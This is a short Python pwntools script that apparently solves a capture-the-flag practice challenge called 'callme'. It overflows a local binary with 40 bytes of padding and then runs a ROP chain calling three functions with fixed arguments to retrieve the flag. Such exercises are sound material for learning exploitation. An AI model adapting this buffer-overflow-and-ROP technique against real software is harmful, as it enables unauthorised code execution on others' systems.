from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./callme', checksec=False)
p = process()

# How many bytes to EIP?
padding = 40

# ROP
rop = ROP(elf)  # Load rop gadgets

params = [0xdeadbeefdeadbeef,
          0xcafebabecafebabe,
          0xd00df00dd00df00d]

rop.callme_one(*params)
rop.callme_two(*params)
rop.callme_three(*params)

print(rop.dump())
# pprint(rop.gadgets)

# Rop chain
rop_chain = rop.chain()
info("rop chain: %r", rop_chain)

# Create payload
payload = flat(
    {padding: rop_chain}
)

# Save payload to file
write("payload", payload)

# PWN
p.sendlineafter('>', payload)
p.recvuntil('Thank you!\n')

# Get our flag!
flag = p.recv()
success(flag)
